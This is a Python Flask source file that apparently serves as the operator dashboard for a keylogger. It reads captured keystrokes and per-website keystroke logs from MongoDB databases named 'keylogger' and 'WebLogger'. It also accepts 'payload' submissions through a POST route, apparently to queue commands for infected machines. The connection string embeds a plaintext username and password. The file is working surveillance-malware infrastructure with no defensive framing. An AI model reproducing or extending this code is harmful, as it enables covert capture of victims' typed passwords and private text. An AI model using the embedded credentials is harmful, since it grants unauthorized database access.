from flask import Flask, render_template, request, redirect, url_for
import os
import pymongo
import datetime

app = Flask(__name__, template_folder=os.path.dirname(os.path.abspath(__file__)))

# MongoDB connection
client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
# Keylogger database
keylogger_db = client["keylogger"]
keylogs_collection = keylogger_db["keylog"]
payload_collection = keylogger_db["payload"]
# Weblogger database
weblogger_db = client["WebLogger"]
site_logs_collection = weblogger_db["sitelogs"]

@app.route('/')
def home():
    # Fetch keylogs from MongoDB
    keylogs = keylogs_collection.find({})
    formatted_keylogs = [f"{log['_id'].generation_time} > {log['text']}" for log in keylogs]

    # Fetch site logs from MongoDB
    site_logs = site_logs_collection.find({})
    formatted_site_logs = [f"<{log['site']}> [{log['_id'].generation_time}] > {log['keystroke']}" for log in site_logs]

    return render_template('index.html', logs=formatted_keylogs, site_logs=formatted_site_logs)

@app.route('/payload', methods=['POST'])
def save_payload():
    if request.method == 'POST':
        payload_data = request.form['payload']
        save_payload_to_db(payload_data)
    return redirect(url_for('home'))

def save_payload_to_db(payload_data):
    payload_document = {"text": payload_data}
    payload_collection.insert_one(payload_document)


if __name__ == '__main__':
    # app.run(host='127.0.0.1', port=8000) #for localhost
    app.run(host='0.0.0.0')
